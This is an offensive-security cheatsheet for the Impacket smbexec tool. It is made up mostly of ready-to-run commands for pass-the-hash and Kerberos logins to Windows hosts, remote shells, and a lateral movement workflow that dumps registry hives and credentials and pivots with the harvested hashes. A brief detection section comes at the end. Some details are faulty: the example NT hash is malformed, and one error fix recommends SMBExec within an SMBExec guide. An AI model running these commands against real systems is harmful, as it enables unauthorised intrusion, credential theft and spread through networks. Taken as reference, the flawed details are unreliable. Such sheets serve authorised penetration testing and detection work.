# Impacket SMBExec Cheatsheet

## Basic Syntax

```bash
impacket-smbexec [options] target
```

**Target format:** `[domain/]username[:password]@<targetName or address>`

---

## Authentication

### Password Authentication

```bash
impacket-smbexec administrator:'P@ssw0rd'@192.168.1.10
```

### Pass-the-Hash

```bash
impacket-smbexec -hashes :NTHASH administrator@192.168.1.10
impacket-smbexec -hashes LMHASH:NTHASH DOMAIN/administrator@192.168.1.10
```

### Kerberos (ccache)

```bash
export KRB5CCNAME=/tmp/admin.ccache
impacket-smbexec -k -no-pass DOMAIN/administrator@dc01.domain.local
```

### Kerberos (AES Key)

```bash
impacket-smbexec -aesKey 000102030405060708090a0b0c0d0e0f0011223344556677889900aabbccddeeff -k DOMAIN/administrator@192.168.1.10
```

### Domain with DC-IP

```bash
impacket-smbexec -hashes :HASH DOMAIN/administrator@192.168.1.10 -dc-ip 192.168.1.5
```

---

## Execution Modes

### Semi-Interactive Shell

```bash
impacket-smbexec administrator:'P@ssw0rd'@192.168.1.10
# Opens C:\> prompt
# Type commands sequentially
```

### Single Command

```bash
impacket-smbexec -hashes :HASH administrator@192.168.1.10 "whoami"
impacket-smbexec -hashes :HASH administrator@192.168.1.10 "ipconfig /all"
```

---

## Common Options

| Flag | Description |
|------|-------------|
| `-hashes LMHASH:NTHASH` | NTLM pass-the-hash authentication |
| `-k` | Use Kerberos authentication |
| `-no-pass` | Don't prompt for password (use with `-k`) |
| `-aesKey hex` | AES key for Kerberos (128 or 256 bits) |
| `-dc-ip ip` | Domain controller IP address |
| `-target-ip ip` | Target IP (when target is NetBIOS name) |
| `-share SHARE` | Output share (default: ADMIN$) |
| `-codec CODEC` | Output encoding (default: utf-8) |
| `-debug` | Enable debug output |
| `-ts` | Add timestamps to log output |

---

## Lateral Movement Workflow

```bash
# 1. Dump credentials from compromised host
impacket-secretsdump administrator:'P@ssw0rd'@192.168.1.10

# 2. Use hash to move laterally
impacket-smbexec -hashes :NTHASH administrator@192.168.1.20

# 3. In the shell, harvest more credentials
C:\> reg save HKLM\SAM C:\temp\sam.hive
C:\> reg save HKLM\SYSTEM C:\temp\system.hive
C:\> reg save HKLM\SECURITY C:\temp\security.hive

# 4. Download and parse
impacket-secretsdump -sam sam.hive -system system.hive -security security.hive LOCAL

# 5. Continue pivoting
impacket-smbexec -hashes :NEW_HASH administrator@192.168.1.30
```

---

## Quick Reference

```bash
# Basic connection
impacket-smbexec admin:'password'@192.168.1.10

# Pass-the-hash (NT only)
impacket-smbexec -hashes :aad3b435b51404eeaad3b435b51404ee334d1cdc94243215df022b101e206e administrator@192.168.1.10

# Domain pass-the-hash
impacket-smbexec -hashes :NTHASH CORP/administrator@192.168.1.10

# Kerberos auth
impacket-smbexec -k -no-pass CORP/administrator@dc01.corp.local

# Single command with debug
impacket-smbexec -hashes :HASH administrator@192.168.1.10 "systeminfo" -debug -ts

# Custom share
impacket-smbexec -share C$ administrator@192.168.1.10

# Non-UTF8 output
impacket-smbexec -codec cp850 administrator@192.168.1.10
```

---

## Error Handling

| Error | Fix |
|-------|-----|
| `STATUS_LOGON_FAILURE` | Wrong password or hash; verify credentials |
| `STATUS_ACCESS_DENIED` | Not admin; try different account |
| `STATUS_PIPE_DISCONNECTED` | Target patched; try SMBExec as alternative |
| `Connection reset` | Firewall blocking; check port 445 |
| `KDC_ERR_PREAUTH_FAILED` | Wrong AES key or no TGT |
| Garbled output | Wrong code page; use `-codec` |
| `STATUS_BAD_NETWORK_NAME` | Share doesn't exist; try `-share C$` |

---

## Detection Indicators

- **Event ID 7045:** New service installed (service name = random bytes)
- **Event ID 7036:** Service started/stopped rapidly
- **Event ID 4624:** Logon Type 3 (Network) from unusual source
- **SMB traffic:** Unusual ADMIN$ share access patterns
- **Service cleanup:** Event ID 7040 (start type changed to disabled)
